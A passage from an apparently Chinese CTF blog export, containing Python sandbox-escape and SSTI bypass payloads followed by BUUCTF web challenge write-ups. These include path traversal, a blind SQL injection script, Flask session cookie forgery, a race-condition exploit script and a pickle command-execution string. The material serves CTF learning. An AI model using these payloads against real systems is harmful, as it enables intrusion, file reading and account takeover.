title=\"过滤中括号\"></a>过滤中括号</h3><p>如果碰到过滤 <code>[ ]</code> ，我们可以将 <code>[]</code> 的功能用 <code>pop</code> 、 <code>__getitem__</code>代替（实际上 <code>a[0]</code> 在内部就是调用了 <code>a.__getitem__(0)</code> ），<code>pop()</code> 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p>\n<pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id=\"过滤引号\"><a href=\"#过滤引号\" class=\"headerlink\" title=\"过滤引号\"></a>过滤引号</h3><p>requests.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 作为变量名将后面的路径传进来，来绕过引号</p>\n<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id=\"过滤双下划线\"><a href=\"#过滤双下划线\" class=\"headerlink\" title=\"过滤双下划线\"></a>过滤双下划线</h3><p>同样利用  requests.args 属性</p>\n<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id=\"过滤关键字\"><a href=\"#过滤关键字\" class=\"headerlink\" title=\"过滤关键字\"></a>过滤关键字</h3><p>除了编码，我们还可以通过字符串拼接</p>\n<p><code>__getattribute__</code> 使用实例访问属性时,调用该方法</p>\n<pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}</code></pre><h2 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h2><ol>\n<li>func_globals</li>\n</ol>\n<p>返回包含函数全局变量的字典的引用-定义函数的模块的全局命名空间</p>\n<ol start=\"2\">\n<li><strong>getattribute</strong></li>\n</ol>\n<p>被调用无条件地实现类的实例的属性访问</p>\n<pre><code>object. getattribute(self, name)\n1）self 必需的。类的实例，在调用时自动传递。\n2）name 必需的。属性的名称。</code></pre><ol start=\"3\">\n<li><strong>subclasses</strong>()[]</li>\n</ol>\n<p>获取子类</p>\n<ol start=\"4\">\n<li>getattr</li>\n</ol>\n<p>返回对象的命名属性的值</p>\n<pre><code>getattr(object,name) &lt;=&gt; object.name\n&gt;&gt;&gt; class A():\n...     bar =1\n...\n\n&gt;&gt;&gt; a = A()\n\n&gt;&gt;&gt; getattr(a,&apos;bar&apos;)\n1</code></pre><ol start=\"5\">\n<li><strong>name</strong></li>\n</ol>\n<p>使用 sys.modules[<strong>name</strong>] 获得模块的引用</p>\n<ol start=\"6\">\n<li><p>timeit</p>\n<p> timeit(命令，number=1)</p>\n<p> import timeit<br> timeit.timeit(“<strong>import</strong>(‘os’).system(‘dir’)”,number=1) </p>\n</li>\n<li><p>platform</p>\n</li>\n</ol>\n<p>模块和平台有关，主要是返回平台的一些信息</p>\n<pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start=\"8\">\n<li><strong>globals</strong></li>\n</ol>\n<p>常与 <code>__init__</code> 配合使用，<code>__init__</code> 一般跟在类的后面。相当于实例化这个类</p>\n<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start=\"9\">\n<li><strong>call</strong></li>\n</ol>\n<p>使实例能够像函数一样被调用 <code>x.call() &lt;=&gt; x()</code></p>\n<ol start=\"10\">\n<li>pickle</li>\n</ol>\n<p>将对象储存在字符串对象中，实现对象的持久化</p>\n<p>序列化：</p>\n<pre><code>import pickle\ntest=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])\np=pickle.dumps(test)</code></pre><p>反序列化：</p>\n<pre><code>n=pickle.loads(p)</code></pre><p>我们可以加载命令：</p>\n<pre><code>pickle.loads(b&quot;cos\\nsystem\\n(S&apos;ls&apos;\\ntR.&quot;)</code></pre><ol start=\"11\">\n<li><p>os/subprocess/commands</p>\n<p>os.system(‘ipconfig’)<br>os.popen(‘ipconfig’)<br>commands.getoutput(‘ipconfig’)<br>commands.getstatusoutput(‘ifconfig’)<br>subrocess.call([‘ipconfig’],shell=true)</p>\n</li>\n<li><p>eval/exec/execfile</p>\n<p>eval() 执行 python 表达式执行的结果</p>\n<p>exec() 动态执行 python 代码，可以执行复杂的 python 代码，eval 只能计算一个表达式</p>\n<p>execfile() 执行一个文件的内容，文件是将被解析为 python 序列的类似模块的文件</p>\n</li>\n</ol>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/hester/p/4694499.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href=\"https://www.restran.net/2015/10/22/how-python-code-run/\" target=\"_blank\" rel=\"noopener\">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href=\"https://www.freebuf.com/articles/system/203208.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/203208.html</a><br><a href=\"https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href=\"https://www.zhihu.com/question/38791962?sort=created\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/38791962?sort=created</a></p>\n</blockquote>\n","text":"10/11/2019 2:26:44 PM Python 沙箱逃逸你真的看懂了么？python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。由于环境中限制了许多敏感模块比如","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"SQL","slug":"SQL","date":"2019-07-28T07:13:47.000Z","updated":"2019-08-10T07:52:36.029Z","comments":true,"path":"api/articles/SQL.json","excerpt":"<p>大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧</p>","keywords":null,"cover":null,"content":null,"text":"大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧宽字节注入GBK是一种多字符的编码，通常来说，一个GBK编码的字符占用两个字节，一个UTF-8的字符占用三个字节。转义字符：为了过滤用户输入数据，对一些特殊字符加上反斜杠”<br>“进行转义，mysql中转义函数有ad","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SQL","slug":"SQL","count":4,"path":"api/tags/SQL.json"}]},{"title":"BUUCTF 刷题(1)","slug":"BUUCTF-WP","date":"2020-04-29T06:43:09.000Z","updated":"2020-04-29T05:56:32.771Z","comments":true,"path":"api/articles/BUUCTF-WP.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"BUUCTF-wp\"><a href=\"#BUUCTF-wp\" class=\"headerlink\" title=\"BUUCTF  wp\"></a>BUUCTF  wp</h1><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Warm-up\"><a href=\"#Warm-up\" class=\"headerlink\" title=\"Warm up\"></a>Warm up</h3><p>查看源码</p>\n<pre><code> &lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&amp;$page)\n        {\n            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];\n            if (! isset($page) || !is_string($page)) {\n                echo &quot;you can&apos;t see it&quot;;\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo &quot;you can&apos;t see it&quot;;\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST[&apos;file&apos;])\n        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])\n        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])\n    ) {\n        include $_REQUEST[&apos;file&apos;];\n        exit;\n    } else {\n        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;\n    }  \n?&gt; </code></pre><p>存在 <code>phpmyadmin 4.8.1</code> 远程文件包含漏洞 <code>cve-2018-12613</code></p>\n<blockquote>\n<p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置</p>\n<p>mb_substr — 获取部分字符串</p>\n</blockquote>\n<p>因为考虑到 <code>file</code> 可能带参数的问题所以先进行了一次 <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code> ，如果这里接下来的判断通过则直接返回 <code>true</code> 。如果失败则对返回的结果进行一次 <code>urldecode</code> ，我们知道浏览器会自动将传输的数据进行一次解码，所以我们传入二次编码的 <code>?-&gt;%253F</code> 之后会经过两次解码得到 <code>?</code> ,从而使返回 <code>true</code> .在 <code>checkfile</code> 返回 <code>true</code> 之后我们就有了目录穿越包含文件。</p>\n<p>我们有两种方法:</p>\n<pre><code>?file=hint.php?../../../../../ffffllllaaaagggg\nfile=hint.php%253f../../../../../ffffllllaaaagggg</code></pre><h2 id=\"easy-tornado\"><a href=\"#easy-tornado\" class=\"headerlink\" title=\"easy_tornado\"></a>easy_tornado</h2><p>打开页面发现三个链接，内容如下</p>\n<pre><code>/flag.txt                //flag in /fllllllllllllag\n/welcome.txt            //render\n/hints.txt                //md5(cookie_secret+md5(filename))</code></pre><p>应该是模板注入，而且需要 cookie_secret .抓包并没有抓到 cookie </p>\n<p>观察链接： <code>file?filename=/flag.txt&amp;filehash=07c1e7d13389a10b75c75c9884c867fb</code> 我们直接访问/fllllllllllllag 报错 <code>/error?msg=Error</code> ，在error 这里尝试 SSTI： <code>error?msg=1</code> 可以执行静态表达式，但是不能做运算。</p>\n<p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象</p>\n<pre><code>1 &lt;title&gt;\n2     {{ escape(handler.settings[\"blog_title\"]) }}\n3 &lt;/title&gt;</code></pre><p>但是奇怪的是RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性！后来重新翻了一下文档，发现又是一个别名。</p>\n<pre><code>RequestHandler.settings\n\nAn alias for self.application.settings.</code></pre><p>handler 指向RequestHandler</p>\n<p>而RequestHandler.settings又指向self.application.settings</p>\n<p>所有handler.settings就指向RequestHandler.application.settings了！</p>\n<p>所以当我们访问 <code>RequestHandler.application.settings</code> 失败时，我们访问 <code>handler.settings</code> 得到 <code>secret_key</code> ,之后使用脚本进行 md5加密之后访问即可：</p>\n<pre><code>import hashlib</code></pre><p>​<br>​    def md5value(s):<br>​        md5 = hashlib.md5()<br>​        md5.update(s.encode())<br>​        return md5.hexdigest()</p>\n<p>​<br>​    def mdfive2():<br>​        filename = ‘/fllllllllllllag’<br>​        cookie = r”M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N<del>J84<em>r”<br>​        #print(md5value(filename))<br>​        # print(md5value(‘</em>c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h</del>R-JFa3Vp8B0N&gt;%+WgjHbvfM@[U’))<br>​        # print(‘’+md5value(filename))<br>​        print(md5value(cookie + md5value(filename)))#hints md5(cookie_secret+md5(filename))</p>\n<p>​<br>​    mdfive2()</p>\n<h2 id=\"CISCN-hack-world\"><a href=\"#CISCN-hack-world\" class=\"headerlink\" title=\"CISCN-hack_world\"></a>CISCN-hack_world</h2><p>进入靶机，看到：</p>\n<pre><code>All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;\nNow, just give the id of passage</code></pre><p>输入0，1，2 分别有不同回显，输入部分关键字显示 <code>bool(false)</code> ,应该是布尔盲注。在bp里FUZZ，<code>or、and、/*、union、空格</code>等都被过滤了。</p>\n<p>直接 <code>select flag from flag</code> 查询被过滤，绕过空格可以用括号 <code>select(flag)from(flag)</code> </p>\n<p>用二分法猜解名字</p>\n<pre><code>import requests\nimport time\n\nurl = &apos;http://be659fb8-1739-4a9f-9f9e-8e2be1e33ce6.node3.buuoj.cn/index.php&apos;\ndata = {&quot;id&quot;:&quot;&quot;}\nflag = &apos;flag{&apos;\n\ni = 6\nwhile True:\n\n    begin = 32\n    end = 126\n    tmp = (begin+end)//2\n    while begin&lt;end:\n        print(begin,tmp,end)\n        time.sleep(1)\n        data[&quot;id&quot;] = &quot;if(ascii(substr((select(flag)from(flag)),{},1))&gt;{},1,2)&quot;.format(i,tmp)\n        r = requests.post(url,data=data)\n        if &apos;Hello&apos; in r.text:\n            begin = tmp+1\n            tmp = (begin+end)//2\n        else:\n            end = tmp\n            tmp = (begin+end)//2\n\n    flag+=chr(tmp)\n    print(flag)\n    i+=1\n    if flag[-1]==&apos;}&apos;:\n        break</code></pre><h2 id=\"HCTF-admin\"><a href=\"#HCTF-admin\" class=\"headerlink\" title=\"HCTF admin\"></a>HCTF admin</h2><p>11/6/2019 8:43:40 PM </p>\n<h3 id=\"flask-session-伪造\"><a href=\"#flask-session-伪造\" class=\"headerlink\" title=\"flask-session 伪造\"></a>flask-session 伪造</h3><p>从源码得到提示下载到了源码</p>\n<p>贴一部分代码：</p>\n<pre><code>index.html\n\n{% if current_user.is_authenticated and session['name'] == 'admin' %}\n\t<h1 class=\"nav\">hctf{xxxxxxxxx}</h1>\n\t{% endif %}\n&lt;!-- you are not admin --&gt;\n&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;\n\n\nconfig.py\n\nimport os\n\nclass Config(object):\n    SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;ckj123&apos;\n    SQLALCHEMY_DATABASE_URI = &apos;mysql+pymysql://root:adsl1234@db:3306/test&apos;\n    SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre><p>​<br>​    routes.py/change<br>​<br>    @app.route(‘/change’, methods = [‘GET’, ‘POST’])<br>    def change():<br>        if not current_user.is_authenticated:<br>            return redirect(url_for(‘login’))<br>        form = NewpasswordForm()<br>        if request.method == ‘POST’:<br>            name = strlower(session[‘name’])<br>            user = User.query.filter_by(username=name).first()<br>            user.set_password(form.newpassword.data)<br>            db.session.commit()<br>            flash(‘change successful’)<br>            return redirect(url_for(‘index’))<br>        return render_template(‘change.html’, title = ‘change’, form = form)</p>\n<p>可以看到用 admin 账户登陆即可得到 flag，这里涉及到了 flask session 伪造，简单搜索我们可以很容易搜到p神的 session<br>解密脚本：</p>\n<pre><code>#!/usr/bin/env python3\nimport sys\nimport zlib\nfrom base64 import b64decode\nfrom flask.sessions import session_json_serializer\nfrom itsdangerous import base64_decode\n\ndef decryption(payload):\n    payload, sig = payload.rsplit(b&apos;.&apos;, 1)\n    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)\n\n    decompress = False\n    if payload.startswith(b&apos;.&apos;):\n        payload = payload[1:]\n        decompress = True\n\n    try:\n        payload = base64_decode(payload)\n    except Exception as e:\n        raise Exception(&apos;Could not base64 decode the payload because of &apos;\n                         &apos;an exception&apos;)\n\n    if decompress:\n        try:\n            payload = zlib.decompress(payload)\n        except Exception as e:\n            raise Exception(&apos;Could not zlib decompress the payload before &apos;\n                             &apos;decoding the payload&apos;)\n\n    return session_json_serializer.loads(payload)\n\nif __name__ == &apos;__main__&apos;:\n    print(decryption(sys.argv[1].encode()))</code></pre><p>先注册一个普通账号进行登陆，得到cookie，经过脚本解密 <code>python3 py3-flask_session_decode.py cookie</code> 得到：</p>\n<pre><code>{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;goya&apos;, &apos;user_id&apos;: &apos;10&apos;}</code></pre><p>通过源码我们看到这句话 <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ，其中 <code>environ</code> 是一个字符串所对应环境的映像对象，例如 </p>\n<pre><code>&gt;&gt;&gt; os.environ[&apos;TEMP&apos;]\n&apos;C:\\\\Users\\\\*****\\\\AppData\\\\Local\\\\Temp&apos;</code></pre><p>当获取不到 <code>SECRET_KEY</code> 时就使用 <code>ckj123</code> 作为密钥，这里我们不确定是不是能获取到环境变量里的key，但是我们用 ckj123 先进行测试。</p>\n<p>利用搜到的脚本 <a href=\"https://github.com/noraj/flask-session-cookie-manager\">https://github.com/noraj/flask-session-cookie-manager</a> 修改 <code>name</code> 为 <code>admin</code> 来生成伪造的cookie：</p>\n<pre><code>python2 flask_session_cookie_manager2.py encode -s &quot;ckj123&quot; -t &quot;{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;10&apos;}&quot;</code></pre><p>生成新 cookie：</p>\n<pre><code>.eJxNkEGPgjAQhf_KpmcPWPBC4kFSIZDMEE2xaS-ERQQKdRPUKBj_-1Y3WT1NMm_me2_mTvLDUJ0a4p-HSzUjebsn_p18fROfSJMYmEoHTbyQdDMCDxtbKTB5hWjtKhY7ysAcBYwqQoN6p3HqrsA3o2J9m_LaUTzsUp45iskb6NVN6pKqKNFy2mrksWVKFwz2wIHaXRd4PQfdtDBtDVDpoIhdKZTl9i1q8DCChdRNj9OaplHYoMk8pWFJHjNSnoZDfv7pquP7BL1vkcYj8tKxMbynnWJPq6CRPOhRJAaZ6pHZOR10ILIp3SxfuNYUdfVP2kXzdbn6U46FeQtSbM-F8F7C5VQNnx8EvrL9xy8gAnGJ.XcK0Ow.1V55Ih_Ip48Y5fgVUgbSNrQlWyU</code></pre><p>此时我们替换已经登陆账号的 cookie 即可得到flag</p>\n<h3 id=\"unicode欺骗\"><a href=\"#unicode欺骗\" class=\"headerlink\" title=\"unicode欺骗\"></a>unicode欺骗</h3><p>看WP看到的另一种方法，挺有意思</p>\n<p>观察路由处的代码：</p>\n<pre><code>@app.route(&apos;/register&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef register():\n\n    if current_user.is_authenticated:\n        return redirect(url_for(&apos;index&apos;))\n\n    form = RegisterForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(form.username.data)**\n        if session.get(&apos;image&apos;).lower() != form.verify_code.data.lower():\n            flash(&apos;Wrong verify code.&apos;)\n            return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form=form)\n        if User.query.filter_by(username = name).first():\n            flash(&apos;The username has been registered&apos;)\n            return redirect(url_for(&apos;register&apos;))\n        user = User(username=name)\n        user.set_password(form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        flash(&apos;register successful&apos;)\n        return redirect(url_for(&apos;login&apos;))\n    return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form = form)\n\n@app.route(&apos;/login&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef login():\n    if current_user.is_authenticated:\n        return redirect(url_for(&apos;index&apos;))\n\n    form = LoginForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(form.username.data)**\n        session[&apos;name&apos;] = name\n        user = User.query.filter_by(username=name).first()\n        if user is None or not user.check_password(form.password.data):\n            flash(&apos;Invalid username or password&apos;)\n            return redirect(url_for(&apos;login&apos;))\n        login_user(user, remember=form.remember_me.data)\n        return redirect(url_for(&apos;index&apos;))\n    return render_template(&apos;login.html&apos;, title = &apos;login&apos;, form = form)\n\n@app.route(&apos;/change&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef change():\n    if not current_user.is_authenticated:\n        return redirect(url_for(&apos;login&apos;))\n    form = NewpasswordForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(session[&apos;name&apos;])**\n        user = User.query.filter_by(username=name).first()\n        user.set_password(form.newpassword.data)\n        db.session.commit()\n        flash(&apos;change successful&apos;)\n        return redirect(url_for(&apos;index&apos;))\n    return render_template(&apos;change.html&apos;, title = &apos;change&apos;, form = form)</code></pre><p>python 已经有了自己的 lower() 函数不用，用了自己定义的 strlower() ，进到这个函数：</p>\n<pre><code>def strlower(username):\n    username = nodeprep.prepare(username)\n    return username</code></pre><p>可以看到 <code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code> 这个函数来自 twisted ,而题目中 <code>Twisted==10.2.0</code> ,版本差距有点大。</p>\n<p>对于一些字符，<a href=\"https://unicode-table.com/en/search/?q=small+capital\" target=\"_blank\" rel=\"noopener\">https://unicode-table.com/en/search/?q=small+capital</a> 这个函数的作用就是</p>\n<pre><code>ᴀ -&gt; A -&gt; a</code></pre><p>我们在上面的网站上找到一个 <code>ā</code> ，然后注册 <code>ādmin</code> ,此时经过一次 <code>strlower()</code> 变为 <code>ADMIN</code> ，之后我们登陆 <code>ADMIN</code> ，再经过一次 <code>strlower()</code> 就成为了 <code>admin</code> 。</p>\n<h3 id=\"条件竞争\"><a href=\"#条件竞争\" class=\"headerlink\" title=\"条件竞争\"></a>条件竞争</h3><p>先注册一个用户然后开一个线程改密码，另一个线程使用 admin 登陆，在某一瞬间生成 admin 的session 时我们改密码的操作也到了，这时就可以修改密码了</p>\n<pre><code>exp.py\n\nimport requests\nimport threading\n\ndef login(s, username, password):\n    data = {\n        &apos;username&apos;: username,\n        &apos;password&apos;: password,\n        &apos;submit&apos;: &apos;&apos;\n    }\n    return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)\n\ndef logout(s):\n    return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)\n\ndef change(s, newpassword):\n    data = {\n        &apos;newpassword&apos;:newpassword\n    }\n    return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)\n\ndef func1(s):\n    login(s, &apos;skysec&apos;, &apos;skysec&apos;)\n    change(s, &apos;skysec&apos;)\n\ndef func2(s):\n    logout(s)\n    res = login(s, &apos;admin&apos;, &apos;skysec&apos;)\n    if &apos;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&apos; in res.text:\n        print(&apos;finish&apos;)\n\ndef main():\n    for i in range(1000):\n        print(i)\n        s = requests.Session()\n        t1 = threading.Thread(target=func1, args=(s,))\n        t2 = threading.Thread(target=func2, args=(s,))\n        t1.start()\n        t2.start()\n\nif __name__ == &quot;__main__&quot;:\n    main()</code></pre><h3 id=\"hide-and-seak\"><a href=\"#hide-and-seak\" class=\"headerlink\" title=\"hide_and_seak\"></a>hide_and_seak</h3><p><strong>zip软连接读取文件</strong></p>\n<p>Linux ln命令是一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。   当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</p>\n<p>Linux文件系统中，有所谓的链接(link)，我们可以将其视为档案的别名，而链接又可分为两种 : 硬链接(hard link)与软链接(symbolic link)，硬链接的意思是一个档案可以有多个名称，而软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软链接却可以跨越不同的文件系统。</p>\n<p>软链接：</p>\n<pre><code>1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式\n2.软链接可以 跨文件系统 ，硬链接不可以\n3.软链接可以对一个不存在的文件名进行链接\n4.软链接可以对目录进行链接</code></pre><p>硬链接：</p>\n<pre><code>1.硬链接，以文件副本的形式存在。但不占用实际空间。\n2.不允许给目录创建硬链接\n3.硬链接只有在同一个文件系统中才能创建</code></pre><p>我们尝试生成一个软连接</p>\n<pre><code>/tmp# ln -s test.txt test\n      ll\nlrwxrwxrwx  1 root  root 8 11月  7 17:41 test -&gt; test.txt\n-rw-r--r--  1 root  root12 11月  7 17:41 test.txt\n\n/tmp# cat test\nhello world\n\n/tmp# cat test.txt\nhello world</code></pre><p>尝试读取文件内容：</p>\n<pre><code>php -r &quot;echo file_get_contents(&apos;test.txt&apos;);&quot;\nhello world\n\nphp -r &quot;echo file_get_contents(&apos;test&apos;);&quot;\nhello world</code></pre><p>然后我们尝试进行压缩 –symlinks 即生成软连接</p>\n<pre><code>zip --symlinks test.zip test</code></pre><h3 id=\"强网杯-高明的黑客\"><a href=\"#强网杯-高明的黑客\" class=\"headerlink\" title=\"强网杯-高明的黑客\"></a>强网杯-高明的黑客</h3><p>打开之后提示我们下载源码，下载完发现是一个有 3002 个php文件的文件夹。</p>\n<p>查看文件内容后发现代码难以阅读，做了很多混淆，但是里面充满了 <code>$_GET &amp; $_POST</code> 以及 <code>eval、exec、assert...</code> 可以看出来这应该藏了一个shell，我们要做的就是把可用的 shell 找出来</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"></span><br><span class=\"line\">target_path = []</span><br><span class=\"line\">path = <span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\"</span></span><br><span class=\"line\">count = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> filename <span class=\"keyword\">in</span> os.listdir(path):</span><br><span class=\"line\">    <span class=\"comment\"># print(os.path.join(path, filename))</span></span><br><span class=\"line\">    target_path.append(filename)</span><br><span class=\"line\">    <span class=\"comment\"># count += 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(target_path)</span></span><br><span class=\"line\"><span class=\"comment\"># print(count)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(target)</span>:</span></span><br><span class=\"line\">    <span 